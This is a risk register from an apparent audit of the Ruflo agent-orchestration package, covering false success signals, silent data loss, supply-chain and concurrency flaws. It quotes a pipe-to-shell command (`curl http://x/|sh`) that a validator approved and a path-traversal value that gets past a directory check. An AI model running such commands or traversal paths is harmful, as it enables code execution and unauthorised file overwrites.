<!-- audit: {"audit_id":"AUD-RUFLO-20260811-221322","tailered_sha":"6172653e0aca0981d0abaf4ad8e9d587667737e9","ruflo_release":"v3.37.0","ruflo_sha":"6ce18b5a7fcd4939a2f72c2e3b8fdbdec660e5a9","generated":"2026-08-12T01:10:00Z","evidence_class":"MIXED","lane":"AUD-L0","caused_by":["AUD-RUFLO-20260811-221322/01-audit-charter.md","AUD-RUFLO-20260811-221322/evidence/findings.jsonl"]} -->

# 14 — Risk register

Risks are what adoption would expose the Tailered AI agent platform to. Each entry names the exposure, the
findings that evidence it, whether it is mitigable by a consumer, and what residual risk survives the
best available mitigation. The per-defect record is `evidence/findings.jsonl`; this file is the
decision-facing view.

Exposure is scored as likelihood × blast radius, both judged against the **shipped default
behaviour**, because defaults are what a team actually gets.

## R1 — Trusting a success signal that is not one · exposure CRITICAL · not mitigable

**Findings:** RUF-011, RUF-401, RUF-402, RUF-440, RUF-002, RUF-006, RUF-001, plus the `cleanup`
residue and the command-validator result in `05-architecture-and-runtime-map.md`.

Six independently reproduced cases where Ruflo reports success for work it did not do: the witness
tool declaring `[OK]` with 53 drift and 2 missing; memory writes reported stored and discarded; a
memory self-test passing while nothing persisted; concurrent claims all reporting `[OK]` while
two-to-three of six were dropped; `init` under-reporting its own file writes by 2.3×; a command
validator returning `[OK] Command validated` for `curl http://x/|sh`.

This is the root risk from which most others follow. It is **not mitigable by a consumer**, because
the only defence is to independently verify every postcondition — which costs more than the
automation saves and defeats the purpose of adopting an orchestration layer at all. Tailered's
constitution treats a false completion claim as voiding the work that claimed it.

**Residual after best mitigation:** unchanged. Do not adopt.

## R2 — Loss of authority over routing, model identity, and spend · exposure CRITICAL · not mitigable

**Findings:** compatibility blockers Q8, Q11, Q12; RUF-010.

Ruflo persists a stateful Thompson-bandit router (`.swarm/model-router-state.json`) where Tailered
law requires a stateless one; honours an explicit model only when it matches one of five hardcoded
literals, and `agent_execute` carries no `model` field at all; and autostarts a daemon on unrelated
commands that runs model-calling workers for up to twelve hours with no reservation. Separately, the
opt-in proxy cloud plane "picks a tier per prompt instead of honoring the client's requested model" —
upstream's own words.

Two systems cannot both own routing and spend. Configuration cannot resolve a disagreement about
where authority lives.

**Residual after best mitigation:** disabling the proxy and the daemon addresses the two most
concrete paths, but the router and model-identity conflict is structural. Do not adopt.

## R3 — Silent data loss · exposure CRITICAL · partially mitigable, at a cost that removes the benefit

**Findings:** RUF-401, RUF-402, RUF-403, plus corrupt-database handling in
`08-reliability-and-data-integrity.md`.

The sql.js/WASM fallback accepts writes, reports success, and discards them; backend selection is a
silent `try/catch`, so the same install persists on glibc and loses everything on musl with no error
and no exit-code change; a corrupt database is listed and written into with exit 0 and no warning.

**Residual after best mitigation:** one could pin the native backend and verify every write from a
second process — at which point Ruflo's memory offers nothing over a plain SQLite file the team
controls. Do not adopt this subsystem in any form.

## R4 — Repository contamination and a second source of truth · exposure HIGH · mitigable only by never pointing Ruflo at a real repository

**Findings:** RUF-009, compatibility blockers Q5, Q7, Q15; RUF-411.

`init` writes 255 files, modifies the tracked `.gitignore`, and drops a 1.5 MB binary `ruvector.db`
into the repository root. Ruflo maintains 32 repository-local state paths and 14 SQLite tables. Even
*reading* memory mutates the repository and spawns a daemon. Tailered's `captureRepositorySnapshot`
excludes only `.git`, `node_modules`, `dist`, `evals`, `labels`, and `.tailered`, so all of this
enters the repository hash and invalidates the per-run context cache on every Ruflo tick.

**Residual after best mitigation:** run Ruflo only inside a disposable worktree that is never the
company repository. That is achievable, and it is the shape any future pilot must take — but it
forecloses most of the value, which was in-repo assistance.

## R5 — Supply chain and provenance · exposure HIGH · partially mitigable

**Findings:** RUF-004, RUF-005, RUF-007, RUF-012, RUF-301, RUF-L1a-07.

A pinned `ruflo@3.37.0` still resolves floating alpha dependencies (`agentdb` alpha.20, `agentic-flow`
alpha.2) because the wrapper depends on `@claude-flow/cli` via `^3.33.0`. `init` fetches an
undeclared, unpinned 90 MB ONNX model at runtime into `node_modules`. The generated MCP registration
is `npx -y ruflo@latest`, so a publish-time compromise executes automatically at the next session
start. `postinstall` walks up to twelve parent directories mutating every reachable `agentdb`,
including pnpm store copies, so any pnpm-based workspace is exposed. The published
package declares MIT while 94.87% of its files are an Apache-2.0 huggingface/chat-ui fork.

**Residual after best mitigation:** pinning `@claude-flow/cli` exactly, committing a lockfile,
installing with `--ignore-scripts`, pre-seeding the model, and rewriting `.mcp.json` removes most of
this. The licence-declaration mismatch is not consumer-mitigable and warrants a real legal read
before any redistribution.

## R6 — Uncontrolled global and machine-scope configuration · exposure MEDIUM · mitigable

**Findings:** RUF-003, RUF-006.

`init` appends to `~/.claude/CLAUDE.md` with no flag, instructing every Claude Code agent on the
machine to route work through Ruflo MCP tools, and writes `~/.claude-flow/update-state.json` and
`~/.config/ruflo/`. It installs 13 hook entries across 10 Claude Code lifecycle events, including
`SessionStart` and `UserPromptSubmit`, while reporting "7 hook types".

Calibrated fairly: the global write is **append-only and non-destructive** — a pre-existing sentinel
`CLAUDE.md` survived verbatim, global `settings.json` was byte-identical, and re-init is idempotent.

**Residual after best mitigation:** container-only execution removes it entirely. Any host that
already registers `SessionStart` or `UserPromptSubmit` hooks would still need a collision review.

## R7 — Concurrency corruption under the exact pattern Tailered needs · exposure HIGH · not mitigable

**Findings:** RUF-440, RUF-441, RUF-442, RUF-443, RUF-444, RUF-452.

Tailered's whole thesis includes bounded parallel execution. Ruflo's claim system loses 2–3 of 6
concurrent claims while reporting success to all callers, leaving two agents owning one issue;
claims never expire; `memory store` aborts with SIGABRT roughly 1 in 6 with no contention; daemon
mutual exclusion is PID-based and fails across PID namespaces. The correct locked, atomic pattern
exists in the same codebase (`workspace-lease.ts`) and is simply not used on this path.

**Residual after best mitigation:** none available to a consumer.

## R8 — Operational cost and latency · exposure MEDIUM · mitigable

**Findings:** `10-performance-and-cost.md`; the cost arithmetic in `11-tailered-compatibility.md` Q21.

Default install is 534 s, 1.5 GB, 50,012 files. `ruflo status` p95 is 18.5 s against the vendor's own
published "CLI startup < 500 ms" target. Ruflo's own measured `$1.56` per `claude -p` call launched
from a project directory means four calls exceed Tailered's exclusive $5.00 cap.

**Residual after best mitigation:** `--omit=optional` cuts the install to 124 MB and 74 s, but
removes the persistence and vector stack entirely — which is where the silent-loss behaviour lives.

## R9 — Capability advertised but unreachable · exposure MEDIUM · not mitigable

**Findings:** RUF-448, RUF-L1a-08, source-to-package parity conclusions.

Worktree isolation — a headline claim — has no `worktree` command on the `ruflo` binary. Three
packages the shipped code dynamically imports (`@claude-flow/guidance`, `@claude-flow/embeddings`,
`@claude-flow/aidefence`) are declared in no dependency field and are not shipped. 37 of 38 plugins
are absent from the install. 23 of the registered MCP tools appear only if an undeclared
`agent-browser` binary is present, so the tool roster silently differs between machines.

**Residual after best mitigation:** none; this is a packaging property. Plan against the *measured*
surface (333 tools live, 90 agents, 1 plugin), never the advertised one.

## R10 — Governance and evidence quality · exposure MEDIUM · not mitigable

**Findings:** count reconciliation across `03-ruflo-capability-inventory.md`; RUF-L1a-03.

No advertised figure matches the live roster on any axis: agents advertised as 60+/100+/98/164
against 90 packaged; MCP tools as 314/103/112+/210/397 against 333 live; commands as 26/60+ against
53. The shipped `catalog-manifest.json` describes a catalog its own tarball does not contain, while
its generator claims the counts come from "real, shipped files". The published
`.claude/settings.json` is invalid JSON.

**Residual after best mitigation:** every number must be independently recounted before use, which
is a standing tax on any relationship with this project.

## R11 — Loss of the constitution from the model's own context · exposure CRITICAL · not mitigable in place

**Findings:** RUF-203, RUF-206.

Tailered's context snapshot admits 23 files from a pristine repository, including `AGENTS.md`, all
four ADRs, and `v1-contract.md`. After `ruflo init` it admits 96 files — 93 under `.claude/` — and
**zero Tailered governing files**, because `listFiles` sorts paths and `.agents`, `.claude`, and
`.swarm` precede `AGENTS.md`, `decisions/`, and `docs/`, exhausting the 512,000-byte budget before
any governing file is reached. `validate` still reports `VERIFIED`, so nothing surfaces the loss.
Separately, a single MCP `memory_store` call that touched no company file changed the snapshot hash,
making `repo_hash` — a ledger field and the snapshot storage key — non-deterministic.

The consequence is precise and severe: the constitutional critique step, whose entire purpose is to
check output against `AGENTS.md`, would run without `AGENTS.md` in context and report success.

**Residual after best mitigation:** Tailered could exclude Ruflo's directories from the snapshot, but
that is a change to Tailered, made necessary by a tool that has not earned it. Do not adopt.

## R12 — Pre-existing Tailered defects exposed by this exercise · exposure CRITICAL · fully mitigable, and should be fixed now

**Findings:** RUF-710, RUF-713, RUF-715, RUF-714, RUF-712, RUF-716, RUF-711, RUF-718, RUF-719.

These are defects in the **host repository**, not in Ruflo, and they exist today at the frozen
baseline whether or not Ruflo is ever adopted. The most serious is that `product/` confinement is a
textual prefix test, so `product/../decisions/ADR-000.md` passes it and overwrites an accepted,
immutable ADR. Alongside it: agents inherit the company repository and the entire parent environment;
the timeout can be disarmed by a descendant holding stdout; and the cost ledger trusts numbers the
agent asserts, with no model or provider identity carried at all.

**Residual after best mitigation:** zero. Each has a small, local fix, listed in
`16-final-recommendation.md`. This is the audit's most immediately actionable output.

## Risks this audit did NOT establish

Stated so the register is not read as broader than the evidence:

- **No hidden credential exfiltration was observed.** An egress *surface* exists (`funnel.ruv.io`,
  a `cognitum.one` proxy, IPFS/Pinata, a first-party GCP registry endpoint), but no lane observed
  credentials leaving the machine. `INFERRED`/`UNKNOWN`, not `VERIFIED`.
- **Model-dependent behaviour is untested.** Swarm execution, autopilot, workflow resume, and test
  generation could not run without model credentials. They are `UNKNOWN`, not refuted.
- **No evidence of malice.** Every finding is consistent with a fast-moving project shipping roughly
  a minor release per day. The problems are of rigour and of authority placement, not intent.
